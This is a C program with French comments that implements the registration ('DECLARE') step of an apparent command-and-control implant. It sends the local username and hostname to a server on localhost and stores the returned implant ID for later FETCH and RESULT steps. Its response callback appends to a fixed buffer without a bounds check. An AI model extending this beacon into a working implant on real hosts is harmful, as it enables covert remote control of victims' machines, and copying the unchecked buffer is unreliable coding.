#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <json-c/json.h>

// Callback pour récupérer la réponse HTTP
size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
    size_t realsize = size * nmemb;
    strncat(buffer, (char *)contents, realsize);
    return realsize;
}

int main() {
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};
    char implant_uid[32] = {0}; // Pour stocker l'implant-uid

    // Initialiser libcurl
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Erreur : échec de l'initialisation de curl\n");
        return 1;
    }

    // Étape 1 : DECLARE
    // Récupérer les informations système
    char username[32], hostname[64], os[32] = "Linux";
    if (getlogin_r(username, sizeof(username)) != 0) {
        strncpy(username, "unknown", sizeof(username) - 1);
        username[sizeof(username) - 1] = '\0'; // Assurer la terminaison
    }
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strncpy(hostname, "unknown", sizeof(hostname) - 1);
        hostname[sizeof(hostname) - 1] = '\0'; // Assurer la terminaison
    }

    // Construire le JSON pour DECLARE
    char json[256];
    snprintf(json, sizeof(json),
             "{\"DECLARE\":{\"username\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\"}}",
             username, hostname, os);
    printf("JSON envoyé : %s\n", json);

    // Configurer la requête HTTP POST
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    // Ajouter un en-tête pour indiquer que le contenu est du JSON
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Exécuter la requête
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Erreur DECLARE : %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return 1;
    }

    // Afficher la réponse brute
    printf("Réponse DECLARE : %s\n", response);

    // Parser la réponse JSON pour extraire l'implant-uid
    struct json_object *parsed_json, *ok_field;
    parsed_json = json_tokener_parse(response);
    if (!parsed_json) {
        fprintf(stderr, "Erreur : impossible de parser la réponse JSON\n");
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return 1;
    }

    // Chercher le champ "OK" dans le JSON (ex. {"OK":"192400CfoO"})
    if (json_object_object_get_ex(parsed_json, "OK", &ok_field)) {
        const char *uid = json_object_get_string(ok_field);
        if (uid) {
            strncpy(implant_uid, uid, sizeof(implant_uid) - 1);
            implant_uid[sizeof(implant_uid) - 1] = '\0'; // Assurer la terminaison
            printf("Implant-uid reçu : %s\n", implant_uid);
        } else {
            fprintf(stderr, "Erreur : implant-uid non trouvé dans la réponse\n");
        }
    } else {
        fprintf(stderr, "Erreur : champ 'OK' non trouvé dans la réponse JSON\n");
    }

    // Libérer les ressources JSON
    json_object_put(parsed_json);

    // Nettoyer les en-têtes et libcurl
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    // L'implant-uid est maintenant stocké dans implant_uid
    // Tu peux l'utiliser pour les étapes suivantes (FETCH, RESULT)
    return 0;
}